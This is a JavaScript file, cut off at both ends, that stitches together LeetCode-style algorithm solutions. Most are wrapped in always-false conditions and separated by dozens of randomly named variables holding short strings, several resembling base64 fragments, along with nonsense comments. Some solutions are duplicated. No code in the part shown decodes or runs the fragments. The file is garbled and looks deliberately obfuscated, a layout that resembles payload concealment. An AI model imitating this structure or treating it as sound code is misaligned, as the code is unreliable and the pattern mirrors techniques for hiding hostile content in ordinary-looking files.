        result += this.sum[row1 - 1][col1 - 1];
    }
    
    return result;
};


/**
 * Your NumMatrix object will be instantiated and called as such:
 * var numMatrix = new NumMatrix(matrix);
 * numMatrix.sumRegion(0, 1, 2, 3);
 * numMatrix.sumRegion(1, 2, 3, 4);
 */

}

    var afttitecwbpa = 'EWfUnPQeqR';
if (7 === 14) {
    /**
A strobogrammatic number is a number that looks the same when rotated 180 degrees (looked at upside down).

Find all strobogrammatic numbers that are of length = n.

For example,
Given n = 2, return ["11","69","88","96"].

Hint:
Try to use recursion and notice that it should recurse with n - 2 instead of n - 1.
*/
/**
 * @param {number} n
 * @return {string[]}
 */
var findStrobogrammatic = function(n) {
    return helper(n, n);
};

function helper(cur, n) {
    if (cur === 0) {
        return [''];
    }
    
    if (cur === 1) {
        return ['1', '8', '0'];
    }
    
    const list = helper(cur - 2, n);
    let result = [];
    
    for (let i = 0; i < list.length; i++) {
        if (cur !== n) {
            result.push('0' + list[i] + '0');
        }
        
        result.push('1' + list[i] + '1');
        result.push('8' + list[i] + '8');
        result.push('6' + list[i] + '9');
        result.push('9' + list[i] + '6');
    }
    
    return result;
}

}

    var fcqkmukoegvb = 'blFnUGl';
    var iacbtvbtortm = 'boANUNCxh';
if ('false' === true) {
    /**
Given a binary search tree, write a function kthSmallest to find the kth smallest element in it.

Note: 
You may assume k is always valid, 1 ≤ k ≤ BST's total elements.

Follow up:
What if the BST is modified (insert/delete operations) often and you need to find the kth smallest frequently? How would you optimize the kthSmallest routine?

Hint:

Try to utilize the property of a BST.
What if you could modify the BST node's structure?
The optimal runtime complexity is O(height of BST).
*/

// SOLUTION 1
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @param {number} k
 * @return {number}
 */
var kthSmallest = function(root, k) {
    var node = root,
        stack = [],
        count = 0,
        right;
    
    while (node) {
        stack.push(node);
        node = node.left;
    }
    
    while (stack.length > 0) {
        node = stack.pop();
        count++;
        
        if (k === count) {
            return node.val;
        }
        
        right = node.right;
        
        while (right) {
            stack.push(right);
            right = right.left;
        }
    }
    
    return null;
};


// SOLUTION 2

/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @param {number} k
 * @return {number}
 */
var kthSmallest = function(root, k) {
    var leftSums = findNodesSum(root.left);
    
    if (leftSums + 1 === k) {
        return root.val;
    }
    
    if (leftSums + 1 < k) {
        return kthSmallest(root.right, k - leftSums - 1);
    }
    
    return kthSmallest(root.left, k);
};

function findNodesSum(root) {
    if (!root) {
        return 0;
    }
    
    return findNodesSum(root.left) + findNodesSum(root.right) + 1;
}

// SOLUTION 3: with modifying property
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @param {number} k
 * @return {number}
 */
var kthSmallest = function(root, k) {
    addCountToNode(root);
    
    return findKth(root, k);
};

function addCountToNode(root) {
    if (!root) {
        return null;
    }
    
    root.count = 1;
    let left = addCountToNode(root.left);
    let right = addCountToNode(root.right);
    
    if (left) {
        root.count += left.count;
    }
    
    if (right) {
        root.count += right.count;
    }
    
    return root;
}

function findKth(root, k) {
    if (!root) {
        return;
    } 
    
    let leftCount;
    
    if (!root.left) {
        leftCount = 0;    
    } else {
        leftCount = root.left.count;
    }
    
    if (leftCount === k - 1) {
        return root.val;
    }
    
    if (leftCount > k - 1) {
        return findKth(root.left, k);
    }
    
    let newCount = k - 1 - leftCount;
    
    return findKth(root.right, newCount);
}

}

    var hupjxsrl = 'CMGF';
    var xmbrsbmhuxba = 'rdIOugeOiK';
    var ordundkjjqzfhih = 'ISmx';
if ('h' === 'Z') {
    /**
The count-and-say sequence is the sequence of integers beginning as follows:
1, 11, 21, 1211, 111221, ...

1 is read off as "one 1" or 11.
11 is read off as "two 1s" or 21.
21 is read off as "one 2, then one 1" or 1211.
Given an integer n, generate the nth sequence.

Note: The sequence of integers will be represented as a string.

 * @param {number} n
 * @return {string}
 */
var countAndSay = function(n) {
    function interpret(s, accum, sum) {
        var times = 1,
            num,
            len = s.length,
            i,
            result = '';
        
        num = s.charAt(0);
        
        for (i = 1; i < len; i++) {
            if (s.charAt(i) !== num) {
                result += times + num;
                num = s.charAt(i);
                times = 1;
            } else {
                times++;
            }
        }
        if (accum === 1) {
            result = '1';
        } else {
            result += times + num;
        }
        if (accum === sum) {
            return result;
        } else {
            return interpret(result, accum + 1, sum);
        }
    }
    return interpret('1', 1, n);
};

}

    var ildnyjf = 'CqmJXC';
    var xugcsziboyleh = 'jMmh2Yk';
if ('false' === true) {
    /**
Given a singly linked list, group all odd nodes together followed by the even nodes. Please note here we are talking about the node number and not the value in the nodes.

You should try to do it in place. The program should run in O(1) space complexity and O(nodes) time complexity.

Example:
Given 1->2->3->4->5->NULL,
return 1->3->5->2->4->NULL.

Note:
The relative order inside both the even and odd groups should remain as it was in the input. 
The first node is considered odd, the second node even and so on ...
*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @return {ListNode}
 */
var oddEvenList = function(head) {
    if (head === null) {
        return null;
    }
    
    var oddHead = head,
        evenHead = head.next,
        oddTail = oddHead,
        evenTail = evenHead,
        node = head.next;
        
    while (node && node.next) {
        oddTail.next = node.next;
        evenTail.next = node.next.next;
        oddTail = oddTail.next;
        evenTail = evenTail.next;
        node = oddTail.next;
    }
    
    oddTail.next = evenHead;
    
    return oddHead;
};

}

    var dzksxb = 'vMaRpGO';
if (0.82 && false) {
    /**
Given an unsorted array return whether an increasing subsequence of length 3 exists or not in the array.

Formally the function should:
Return true if there exists i, j, k 
such that arr[i] < arr[j] < arr[k] given 0 ≤ i < j < k ≤ n-1 else return false.
Your algorithm should run in O(n) time complexity and O(1) space complexity.

Examples:
Given [1, 2, 3, 4, 5],
return true.

Given [5, 4, 3, 2, 1],
return false.

Credits:
Special thanks to @DjangoUnchained for adding this problem and creating all test cases.
*/
/**
 * @param {number[]} nums
 * @return {boolean}
 */
var increasingTriplet = function(nums) {
    var len = nums.length,
        x1 = Number.MAX_VALUE,
        x2 = Number.MAX_VALUE,
        i;
        
    for (i = 0; i < len; i++) {
        if (nums[i] < x1) {
            x1 = nums[i];
        } else if (x1 < nums[i] && nums[i] < x2) {
            x2 = nums[i];
        } else if (nums[i] > x2) {
            return true;
        }
    }
    
    return false;
};

}

    var xvumuxma = 'dRZ0p';
    var rzobjkky = 'eSJeC';
    var wcpiqigppcfarz = 'pWWdJV';
    var zbwwdvihipa = 'MJvTnsXZy';
    var hxslen = '1JsWW5W';
if (!true && 1) {
    /**
Note: This is an extension of House Robber.

After robbing those houses on that street, the thief has found himself a new place for his thievery so that he will not get too much attention. This time, all houses at this place are arranged in a circle. That means the first house is the neighbor of the last one. Meanwhile, the security system for these houses remain the same as for those in the previous street.

Given a list of non-negative integers representing the amount of money of each house, determine the maximum amount of money you can rob tonight without alerting the police.
*/
/**
 * @param {number[]} nums
 * @return {number}
 * 因为首尾相连了，所以第一家和最后一家只能抢其中的一家，或者都不抢，那我们这里变通一下，如果我们把第一家和最后一家分别去掉，各算一遍能抢的最大值，然后比较两个值取其中较大的一个即为所求。
 */
var rob = function(nums) {
    var len = nums.length;
    
    if (len === 0) {
        return 0;
    }
    
    if (len === 1) {
        return nums[0];
    }
    
    return Math.max(getMax(0, len - 1, nums), getMax(1, len, nums));
};

function getMax(start, end, nums) {
    var arr = [],
        i;
    
    if (end - start <= 1) {
        return nums[start];
    }
    
    arr[start] = nums[start];
    arr[start + 1] = Math.max(nums[start], nums[start + 1]);
    
    for (i = start + 2; i < end; i++) {
        arr[i] = Math.max(arr[i - 1], arr[i - 2] + nums[i]);
    }
    
    return arr[end - 1];
}

}

    var rwjvhu = 'PLaj';
    var gvkyzfdhhtsdplr = 'bloyV';
    var xacfasysqk = 'GgJQpxPr';
if (0.73 && false) {
    /**
Given a binary tree and a sum, find all root-to-leaf paths where each path's sum equals the given sum.

For example:
Given the below binary tree and sum = 22,
              5
             / \
            4   8
           /   / \
          11  13  4
         /  \    / \
        7    2  5   1
return
[
   [5,4,11,2],
   [5,8,4,5]
]
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @param {number} sum
 * @return {number[][]}
 */
var pathSum = function(root, sum) {
    var result = [];
    
    if (!root) {
        return result;
    }
    
    genPath(result, root, [], 0, sum);
    
    return result;
};

function genPath(result, root, curArr, curSum, target) {
    curArr.push(root.val);
    curSum += root.val;
    
    if ((curSum === target) && !root.left && !root.right) {
        result.push(curArr);
        return;
    }
    
    if (root.left) {
        genPath(result, root.left, curArr.concat(), curSum, target);
    }
    
    if (root.right) {
        genPath(result, root.right, curArr.concat(), curSum, target);
    }
}

}

    var awwukaajwaf = 'nlW';
    var yphpjvip = 'TGOAX';
// variable hsbxpsv variable loop world await await await import
    var ltgyptte = 'cPHfMuXT';
    var pkylgqhqz = 'SEpwWjJ';
    var ejhayzq = 'HNgz';
    var ifirkmws = 'kbGNtVm';
if (typeof document === 'undefined') {
    /**
Given a pattern and a string str, find if str follows the same pattern.

Here follow means a full match, such that there is a bijection between a letter in pattern and a non-empty word in str.

Examples:
pattern = "abba", str = "dog cat cat dog" should return true.
pattern = "abba", str = "dog cat cat fish" should return false.
pattern = "aaaa", str = "dog cat cat dog" should return false.
pattern = "abba", str = "dog dog dog dog" should return false.
Notes:
You may assume pattern contains only lowercase letters, and str contains lowercase letters separated by a single space.
*/

/**
 * @param {string} pattern
 * @param {string} str
 * @return {boolean}
 */
var wordPattern = function(pattern, str) {
    var arr = str.split(' '),
        len = arr.length,
        map1 = {},
        map2 = {},
        curChar,
        curString,
        i;
    
    if (pattern.length !== len) {
        return false;
    }
    
    for (i = 0; i < len; i++) {
        curChar = pattern.charAt(i);
        curString = arr[i];
        
        if (!map1.hasOwnProperty(curChar) && !map2.hasOwnProperty(curString)) {
            map1[curChar] = curString;
            map2[curString] = curChar;
        } else if (map1[curChar] !== curString || map2[curString] !== curChar) {
            return false;
        }
    }
    
    return true;
};

}

    var mhmixigiec = 'AHYrIucd';
    var gzvvehxf = 'tLU';
    var wytmfnysvxa = 'QNNSkqwVJ';
    var fgiifvfcfmdor = '0I3Q2lBZ0l';
    var jfyksfzbbyot = 'YjoEZv';
    var fwjgretc = 'DQW';
    var bqwjitn = 'yDQwkeeDT';
    var qqsosfgmmush = 'dJQ0Fn';
    var odeqwpt = 'MZsVQ';
    var lmsngdkdmghiy = 'SUNBZ0lHUm';
    var onpzikhd = 'DXUtUypw';
    var qidzihxnwm = 'xZb';
    var fcglkmx = 'rtetmw';
    var ixdqkovq = 'lZu';
if (0.45 && false) {
    /**
Given a m x n matrix, if an element is 0, set its entire row and column to 0. Do it in place.

click to show follow up.

Follow up:
Did you use extra space?
A straight forward solution using O(mn) space is probably a bad idea.
A simple improvement uses O(m + n) space, but still not the best solution.
Could you devise a constant space solution?
*/
/**
 * @param {number[][]} matrix
 * @return {void} Do not return anything, modify matrix in-place instead.
 */
var setZeroes = function(matrix) {
    var rLen = matrix.length,
        cLen,
        i,
        j,
        firstRowZero,
        firstColumnZero;
        
    if (rLen === 0) {
        return;
    }
    
    cLen = matrix[0].length;
    
    if (matrix[0][0] === 0) {
        firstRowZero = true;
        firstColumnZero = true;
    } else {
        for (i = 1; i < cLen; i++) {
            if (matrix[0][i] === 0) {
                firstRowZero = true;
                break;
            }
        }
        
        for (i = 1; i < rLen; i++) {
            if (matrix[i][0] === 0) {
                firstColumnZero = true;
                break;
            }
        }
    }
    
    for (i = 1; i < rLen; i++) {
        for (j = 1; j < cLen; j++) {
             if (matrix[i][j] === 0) {
                 matrix[0][j] = 0;
                 matrix[i][0] = 0;
             }
        }
    }
    
    for (i = 1; i < cLen; i++) {
        if (matrix[0][i] === 0) {
            for (j = 1; j < rLen; j++) {
                matrix[j][i] = 0;
            }
        }
    }
    
    for (i = 1; i < rLen; i++) {
        if (matrix[i][0] === 0) {
            for (j = 1; j < cLen; j++) {
                matrix[i][j] = 0;
            }
        }
    }
    
    if (firstRowZero) {
        for (i = 0; i < cLen; i++) {
            matrix[0][i] = 0;
        }
    }
    
    if (firstColumnZero) {
        for (j = 0; j < rLen; j++) {
            matrix[j][0] = 0;
        }
    }
};

}

    var nwvrkiccd = 'VyFrMrnEw';
    var jkurrfm = 'UkdWMFpX';
    var kffpusl = 'rbChsXsWt';
if (!true && 0) {
    /**
Given a digit string, return all possible letter combinations that the number could represent.

A mapping of digit to letters (just like on the telephone buttons) is given below.



Input:Digit string "23"
Output: ["ad", "ae", "af", "bd", "be", "bf", "cd", "ce", "cf"].
Note:
Although the above answer is in lexicographical order, your answer could be in any order you want.
*/
/**
 * @param {string} digits
 * @return {string[]}
 */
var letterCombinations = function(digits) {
    var len = digits.length,
        result = [],
        map = {
            '1': [''],
            '2': ['a', 'b', 'c'],
            '3': ['d', 'e', 'f'],
            '4': ['g', 'h', 'i'],
            '5': ['j', 'k', 'l'],
            '6': ['m', 'n', 'o'],
            '7': ['p', 'q', 'r', 's'],
            '8': ['t', 'u', 'v'],
            '9': ['w', 'x', 'y', 'z']
        };
        
    if (len === 0) {
        return result;
    }
    
    return genStrings([''], 0, len, digits, map);
};

function genStrings(curArr, index, len, digits, map) {
    var length = curArr.length,
        next = [],
        temp,
        i,
        j;
    
    if (index === len) {
        return curArr;
    }
    
    for (i = 0; i < length; i++) {
        for (j = 0; j < map[digits.charAt(index)].length; j++) {
            temp = curArr[i] + map[digits.charAt(index)][j];
            next.push(temp);
        }
    }    
    
    return genStrings(next, index + 1, len, digits, map);
}

}

    var sudisallqfp = 'TjBaV1F';
if (!true && 1) {
    /**
Given a string, find the length of the longest substring without repeating characters.

Examples:

Given "abcabcbb", the answer is "abc", which the length is 3.

Given "bbbbb", the answer is "b", with the length of 1.

Given "pwwkew", the answer is "wke", with the length of 3. Note that the answer must be a substring, "pwke" is a subsequence and not a substring.
*/
/**
 * @param {string} s
 * @return {number}
 */
var lengthOfLongestSubstring = function(s) {
    var len = s.length,
        max = 0,
        chars = new Set(),
        leftBound = 0,
        ch,
        i;
        
    for (i = 0; i < len; i++) {
        ch = s.charAt(i);
        
        if (chars.has(ch)) {
            // find the repeating character
            while (leftBound < i && s.charAt(leftBound) !== ch) {
                chars.delete(s.charAt(leftBound));
                leftBound++;
            }
            
            leftBound++;
        } else {
            chars.add(ch);
            max = Math.max(max, i - leftBound + 1);
        }
    }
    
    return max;
};

}

    var afdgpfbeah = 'gVPb';
    var ipugsshwbwubx = 'nUFN';
    var dvwhvkkwhdxw = 'CnIoEhuh';
    var ttqpwrrqdrbypt = 'CMGNuV';
    var dqtulcsojjak = 'ChcJ';
    var obldgtj = 'mxPd29nSUN';
    var vrtsamehljll = 'NulLD';
if (89 > 158) {
    /**
Given a m x n matrix, if an element is 0, set its entire row and column to 0. Do it in place.

click to show follow up.

Follow up:
Did you use extra space?
A straight forward solution using O(mn) space is probably a bad idea.
A simple improvement uses O(m + n) space, but still not the best solution.
Could you devise a constant space solution?
*/
/**
 * @param {number[][]} matrix
 * @return {void} Do not return anything, modify matrix in-place instead.
 */
var setZeroes = function(matrix) {
    var rLen = matrix.length,
        cLen,
        i,
        j,
        firstRowZero,
        firstColumnZero;
        
    if (rLen === 0) {
        return;
    }
    
    cLen = matrix[0].length;
    
    if (matrix[0][0] === 0) {
        firstRowZero = true;
        firstColumnZero = true;
    } else {
        for (i = 1; i < cLen; i++) {
            if (matrix[0][i] === 0) {
                firstRowZero = true;
                break;
            }
        }
        
        for (i = 1; i < rLen; i++) {
            if (matrix[i][0] === 0) {
                firstColumnZero = true;
                break;
            }
        }
    }
    
    for (i = 1; i < rLen; i++) {
        for (j = 1; j < cLen; j++) {
             if (matrix[i][j] === 0) {
                 matrix[0][j] = 0;
                 matrix[i][0] = 0;
             }
        }
    }
    
    for (i = 1; i < cLen; i++) {
        if (matrix[0][i] === 0) {
            for (j = 1; j < rLen; j++) {
                matrix[j][i] = 0;
            }
        }
    }
    
    for (i = 1; i < rLen; i++) {
        if (matrix[i][0] === 0) {
            for (j = 1; j < cLen; j++) {
                matrix[i][j] = 0;
            }
        }
    }
    
    if (firstRowZero) {
        for (i = 0; i < cLen; i++) {
            matrix[0][i] = 0;
        }
    }
    
    if (firstColumnZero) {
        for (j = 0; j < rLen; j++) {
            matrix[j][0] = 0;
        }
    }
};

}

    var comecbzjbor = 'BZ0lDQWd';
    var cdfppfqyrylx = 'bhBTccBeq';
    var nirkm = 'JQ0FnSUNC';
    var qdgexopcdqtt = 'rFkGkcFegj';
    var qbudgeylwa = 'a1p';
    var qhmomjetd = 'qPsgcPzj';
if (Array.isArray(6)) {
    /**
Design a stack that supports push, pop, top, and retrieving the minimum element in constant time.

push(x) -- Push element x onto stack.
pop() -- Removes the element on top of the stack.
top() -- Get the top element.
getMin() -- Retrieve the minimum element in the stack.


 * @constructor
 */
var MinStack = function() {
    this.min = [];
    this.arr = [];
};

/**
 * @param {number} x
 * @returns {void}
 */
MinStack.prototype.push = function(x) {
    var len = this.min.length;
    if (this.arr.length === 0) {
        this.min.push(x);
    } else if (this.min[len - 1] >= x) {
        this.min.push(x);
    }
    this.arr.push(x);
};

/**
 * @returns {void}
 */
MinStack.prototype.pop = function() {
    var elem,
        len = this.min.length;
    if (this.arr.length > 0) {
        elem = this.arr.pop();
    }
    if (elem === this.min[len - 1]) {
        this.min.pop();   
    }
};

/**
 * @returns {number}
 */
MinStack.prototype.top = function() {
    var len = this.arr.length;
    if (len > 0) {
        return this.arr[len - 1];
    }
    
};

/**
 * @returns {number}
 */
MinStack.prototype.getMin = function() {
    var len = this.min.length;
    return this.min[len - 1];
};

}

    var wkcuykagfci = 'XSj';
    var vxkltkqbyti = 'TTNSjdeg';
    var hunwqavvaliarsr = 'FaMm';
    var vdxddpbeun = 'JrrJoJBxGC';
if (typeof navigator === 'undefined') {
    /**
For a undirected graph with tree characteristics, we can choose any node as the root. The result graph is then a rooted tree. Among all possible rooted trees, those with minimum height are called minimum height trees (MHTs). Given such a graph, write a function to find all the MHTs and return a list of their root labels.

Format
The graph contains n nodes which are labeled from 0 to n - 1. You will be given the number n and a list of undirected edges (each edge is a pair of labels).

You can assume that no duplicate edges will appear in edges. Since all edges are undirected, [0, 1] is the same as [1, 0] and thus will not appear together in edges.

Example 1:

Given n = 4, edges = [[1, 0], [1, 2], [1, 3]]

        0
        |
        1
       / \
      2   3
return [1]

Example 2:

Given n = 6, edges = [[0, 3], [1, 3], [2, 3], [4, 3], [5, 4]]

     0  1  2
      \ | /
        3
        |
        4
        |
        5
return [3, 4]

Hint:

How many MHTs can a graph have at most?
Note:

(1) According to the definition of tree on Wikipedia: “a tree is an undirected graph in which any two vertices are connected by exactly one path. In other words, any connected graph without simple cycles is a tree.”

(2) The height of a rooted tree is the number of edges on the longest downward path between the root and a leaf.
*/

/**
 * @param {number} n
 * @param {number[][]} edges
 * @return {number[]}
 */
var findMinHeightTrees = function(n, edges) {
    var map = [], // map[i]是一个一维数组，保存了i节点可以到达的所有节点 
        len = edges.length,
        leaves = [],
        newLeaves,
        leaf,
        newLeaf,
        curEdge,
        i,
        j;
    
    if (len === 0) {
        leaves.push(0);
        return leaves;
    }
    
    for (i = 0; i < n; i++) {
        map[i] = [];
    }
    
    for (i = 0; i < len; i++) {
        curEdge = edges[i];
        map[curEdge[0]].push(curEdge[1]);
        map[curEdge[1]].push(curEdge[0]);
    }
    
    for (i = 0; i < n; i++) {
        if (map[i].length === 1) {
            leaves.push(i);
        }
    }
    
    while(n > 2) {
        n -= leaves.length;
        newLeaves = [];
        
        for (i in leaves) {
            leaf = leaves[i];
            for (j in map[leaf]) {
                newLeaf = map[leaf][j];
                map[newLeaf].splice(map[newLeaf].indexOf(leaf), 1);
                map[leaf] = [];
                
                if (map[newLeaf].length === 1) {
                    newLeaves.push(newLeaf);
                }
            }
        }
        
        leaves = newLeaves;
    }
    
    return leaves;
};

}

    var zhldr = 'RsY2xSeWFX';
if (null === 0) {
    
/**
 * Given an array of integers, every element appears twice except for one. Find that single one.
 * Note:
 * Your algorithm should have a linear runtime complexity. Could you implement it without using extra memory?
 * 
 * @param {number[]} A
 * @return {number}
 */
var singleNumber = function(A) {
    var length = A.length,
        i,
        result = 0;
    if (length === 1) {
        return A[0];
    }
    for (i = 0; i < length; i++) {
        result = result ^ A[i];
    }
    return result;
};

}

    var wxhcvgrcj = 'JdJKIaJOO';
    var okpwp = 'ZG5a';
    var trlliobltnf = 'YjyAG';
// constant debug array loop number async
    var hoacqflwzxyv = 'HEYVidSUu';
if ('true' === true) {
    /**
Given an integer n, return the number of trailing zeroes in n!.

Note: Your solution should be in logarithmic time complexity.
*/

/**
 * @param {number} n
 * @return {number}
 */
var trailingZeroes = function(n) {
    var divider = 5,
        reminder = 0;
    
    while (divider <= n) {
        reminder += Math.floor(n/divider);
        divider = divider * 5;
    }
    
    return reminder;
};

}

    var lwkcrnn = 'WEpsW';
    var ltwdfp = 'XYTVtYI';
// lcyfwnt import value event object
    var xmpssn = 'ynnW';
if (typeof document === 'undefined') {
    /**
Implement pow(x, n).
*/
/**
 * @param {number} x
 * @param {number} n
 * @return {number}
 */
var myPow = function(x, n) {
    if (n < 0) {
        return 1 / power(x, n);
    }
    
    return power(x, n);
};

function power(x, n) {
    if (n === 0) {
        return 1;
    }
    
    var v = power(x, parseInt(n/2));
    
    if (n % 2 === 0) {
        return v * v;
    }
    
    return v * v * x;
}

}

    var dpaqhistvyta = 'kNBOUlIU';
if (!true && 0) {
    /**
Given an array of strings, return all groups of strings that are anagrams.

Note: All inputs will be in lower-case.
*/

/**
 * @param {string[]} strs
 * @return {string[]}
 */
var anagrams = function(strs) {
    var map = {},
        len = strs.length,
        curStr,
        newArr,
        sortedArr,
        sortedStr,
        result = [],
        i;
    
    for (i = 0; i < len; i++) {
        curStr = strs[i];
        sortedArr = curStr.split('');
        sortedStr = sortedArr.sort().join('');
        
        if (map.hasOwnProperty(sortedStr)) {
            map[sortedStr].push(curStr);
        } else {
            newArr = [];
            newArr.push(curStr);
            map[sortedStr] = newArr; 
        }
    }
    
    len = map.length;
    
    for (var key in map) {
        if (map[key].length > 1) {
            result = result.concat(map[key]);
        }
    }
    
    return result;
};

}

    var wwgjfewrrh = 'OIlYUteCnO';
if (Array.isArray(9)) {
    /**
You are climbing a stair case. It takes n steps to reach to the top.

Each time you can either climb 1 or 2 steps. In how many distinct ways can you climb to the top?

 * @param {number} n
 * @return {number}
 */
var climbStairs = function(n) {
    var arr = [],
        i;
    
    arr[0] = 0;
    arr[1] = 1;
    arr[2] = 2;
    
    for(i = 3; i <= n; i++) {
        arr[i] = arr[i - 1] + arr[i - 2];
    }
    return arr[n];
};

}

    var ctqllzpvpylk = 'nlkV1U3';
if ('w' === 'E') {
    /**
Given an array nums, write a function to move all 0's to the end of it while maintaining the relative order of the non-zero elements.

For example, given nums = [0, 1, 0, 3, 12], after calling your function, nums should be [1, 3, 12, 0, 0].

Note:
You must do this in-place without making a copy of the array.
Minimize the total number of operations.
*/

/**
 * @param {number[]} nums
 * @return {void} Do not return anything, modify nums in-place instead.
 */
var moveZeroes = function(nums) {
    var len = nums.length,
        curIndex = 0,
        i;
    
    for (i = 0; i < len; i++) {
        if (nums[i] === 0) {
            continue;
        }
        
        nums[curIndex] = nums[i];
        curIndex++;
    }
    
    for (i = curIndex; i < len; i++) {
        nums[i] = 0;
    }
};

}

    var gqbyybkdf = 'LMZrnUXWdL';
    var ltfohr = 'Q2lBZ0lDQ';
    var iqrqbuhthb = 'LmQO';
    var rrjghjaxp = 'WdJQ0FnS';
    var ddaegk = 'aqiGG';
    var ohaogirjsol = 'UNBZ0lIZ';
    var duwgdkghdl = 'pWpKCAbKLa';
    var bnniuzwzrfxjfs = 'HBi';
    var clqkzknxqr = 'npfr';
    var urezcpeo = 'bVJ2ZHk';
if (4 instanceof String) {
    /**
Given a collection of numbers that might contain duplicates, return all possible unique permutations.

For example,
[1,1,2] have the following unique permutations:
[1,1,2], [1,2,1], and [2,1,1].
*/
/**
 * @param {number[]} nums
 * @return {number[][]}
 */
var permuteUnique = function(nums) {
    var len = nums.length,
        result = [];
    
    nums.sort(function(a, b) {
        return a - b;
    });
    
    genPerm(result, 0, len, [], [], nums);
    
    return result;
};

function genPerm(result, index, len, curArr, used, nums) {
    if (curArr.length === len) {
        result.push(curArr);
        return;
    }
    
    var i;
    
    for (i = 0; i < len; i++) {
        if (used[i] || (i > 0 && nums[i] === nums[i - 1] && !used[i - 1])) {
            continue;
        }
        
        curArr.push(nums[i]);
        used[i] = true;
        genPerm(result, i + 1, len, curArr.concat(), used.concat(), nums);
        used[i] = false;
        curArr.pop();
    }
}
}

    var fnyzzpzqehuw = 'riBWo';
    var mlkvlnnhvxatafa = '1c2IyTmh';
if (!true && 1) {
    /**
Given a linked list and a value x, partition it such that all nodes less than x come before nodes greater than or equal to x.

You should preserve the original relative order of the nodes in each of the two partitions.

For example,
Given 1->4->3->2->5->2 and x = 3,
return 1->2->2->4->3->5.

*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @param {number} x
 * @return {ListNode}
 */
var partition = function(head, x) {
    var cur = head,
        next,
        preHead,
        preTail,
        afterHead,
        afterTail;
    
    if (head === null) {
        return null;
    }
    
    while(cur) {
        next = cur.next;
        cur.next = null;
        if (cur.val < x) {
            if (!preHead) {
                preHead = cur;
                preTail = cur;
            } else {
                preTail.next = cur;
                preTail = cur;
            }
        } else {
            if (!afterHead) {
                afterHead = cur;
                afterTail = cur;
            } else {
                afterTail.next = cur;
                afterTail = cur;
            }
        }
        cur = next;
    }
    
    if (preTail) {
        preTail.next = afterHead;
        return preHead;
    } else {
        return afterHead;
    }
};

}

    var jjslkk = 'SPOFNar';
if (1 === 18) {
    /**
Given an array of strings, return all groups of strings that are anagrams.

Note: All inputs will be in lower-case.
*/

/**
 * @param {string[]} strs
 * @return {string[]}
 */
var anagrams = function(strs) {
    var map = {},
        len = strs.length,
        curStr,
        newArr,
        sortedArr,
        sortedStr,
        result = [],
        i;
    
    for (i = 0; i < len; i++) {
        curStr = strs[i];
        sortedArr = curStr.split('');
        sortedStr = sortedArr.sort().join('');
        
        if (map.hasOwnProperty(sortedStr)) {
            map[sortedStr].push(curStr);
        } else {
            newArr = [];
            newArr.push(curStr);
            map[sortedStr] = newArr; 
        }
    }
    
    len = map.length;
    
    for (var key in map) {
        if (map[key].length > 1) {
            result = result.concat(map[key]);
        }
    }
    
    return result;
};

}

    var ecieikfbwprij = 'kR2';
    var jnqfaok = 'yvPi';
    var ekfcwoz = 'x2Ymk1e';
    var issmgld = 'ommKNWZsw';
if ('true' === true) {
    // TODO: optimize
/**
 * @param {number} n
 * @return {string[]}
 */
var generateParenthesis = function(n) {
    var i = 1,
        result = [];
    
    if (n === 0) {
        return result;
    }
    
    result.push('()');
    
    while (i < n) {
        result = helper(result);
        i++;
    }
    
    return result;
};

function helper(arr) {
    var len = arr.length,
        result = [],
        len1,
        curStr,
        tmp,
        i,
        j;
        
    len1 = arr[0].length;
    
    for (i = 0; i < len; i++) {
        curStr = arr[i];
        
        for (j = 0; j < len1; j++) {
            tmp = curStr.substring(0, j) + '()' + curStr.substring(j);
            
            if (result.indexOf(tmp) === -1) {
                result.push(tmp);
            }
        }
    }
    
    return result;
}

}

    var ijcevejlomewc = 'VpYQnNZV0';
    var aokjvjy = 'QuDw';
// variable define value xblfrp string
    var krsxcsfcuq = 'RznO';
    var lgxflvwvrnk = '5sS0Nkb';
    var tmbgjayczfv = 'OlNgHYsP';
    var nfivt = '2RIUn';
    var mzwopnx = 'PTkxYmV';
if (1.00 && false) {
    /**
There are two sorted arrays nums1 and nums2 of size m and n respectively. Find the median of the two sorted arrays. The overall run time complexity should be O(log (m+n)).


*/
/**
 * @param {number[]} nums1
 * @param {number[]} nums2
 * @return {number}
 */
var findMedianSortedArrays = function(nums1, nums2) {
    var len1 = nums1.length,
        len2 = nums2.length,
        len = len1 + len2;
        
    if (len % 2 === 1) {
        return findMedianHelper(0, nums1, 0, nums2, (len + 1) / 2);
    } else {
        return (findMedianHelper(0, nums1, 0, nums2, len / 2) + findMedianHelper(0, nums1, 0, nums2, len / 2 + 1)) / 2;
    }
};

function findMedianHelper(aStart, numsA, bStart, numsB, k) {
    if (aStart >= numsA.length) {
        return numsB[bStart + k - 1];
    }
    
    if (bStart >= numsB.length) {
        return numsA[aStart + k - 1];
    }
    
    if (k === 1) {
        return Math.min(numsA[aStart], numsB[bStart]);
    }
    
    var aKey = aStart + parseInt(k / 2) - 1 < numsA.length? numsA[aStart + parseInt(k / 2) - 1] : Number.MAX_VALUE,
        bKey = bStart + parseInt(k / 2) - 1 < numsB.length? numsB[bStart + parseInt(k / 2) - 1] : Number.MAX_VALUE;
        
    if (aKey < bKey) {
        return findMedianHelper(aStart + parseInt(k / 2), numsA, bStart, numsB, k - parseInt(k / 2));
    }
    
    return findMedianHelper(aStart, numsA, bStart + parseInt(k / 2), numsB, k - parseInt(k / 2));
}

}

    var wiguvxjdyy = 'djem92TD';
if (typeof navigator === 'undefined') {
    /**
Given a binary search tree (BST), find the lowest common ancestor (LCA) of two given nodes in the BST.

According to the definition of LCA on Wikipedia: “The lowest common ancestor is defined between two nodes v and w as the lowest node in T that has both v and w as descendants (where we allow a node to be a descendant of itself).”

        _______6______
       /              \
